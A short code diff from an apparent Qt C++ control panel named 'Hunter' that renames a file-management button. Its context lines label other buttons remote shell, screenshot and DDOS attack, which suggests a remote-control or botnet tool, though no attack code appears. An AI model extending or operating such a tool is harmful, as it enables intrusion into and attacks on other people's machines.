@@ -37,7 +37,7 @@ Hunter::Hunter(QWidget *parent)
     ui->btReboot->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     ui->btOffline->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
     // 按钮文字
-    ui->btFile->setText("文件\n管理");
+    ui->btFile->setText("文件\n操作");
     ui->btShell->setText("远程\nShell");
     ui->btScreen->setText("屏幕\n截图");
     ui->btDDos->setText("DDOS\n攻击");
